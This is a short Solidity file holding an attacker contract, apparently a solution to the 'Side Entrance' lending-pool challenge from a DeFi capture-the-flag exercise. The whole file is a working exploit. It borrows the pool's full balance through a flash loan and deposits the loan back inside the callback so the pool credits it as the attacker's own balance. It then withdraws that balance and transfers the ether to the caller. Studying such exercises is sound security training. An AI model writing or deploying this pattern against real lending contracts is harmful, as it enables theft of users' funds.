pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
  function flashLoan(uint256 amount) external;
  function deposit() external payable;
  function withdraw() external;
}

contract SideEntranceAttacker {
  function attack(address pool) external {
    ISideEntranceLenderPool(pool).flashLoan(pool.balance);
    ISideEntranceLenderPool(pool).withdraw();
    payable(msg.sender).transfer(address(this).balance);
  }

  function execute() payable external {
    ISideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
  }

  receive() payable external {}
}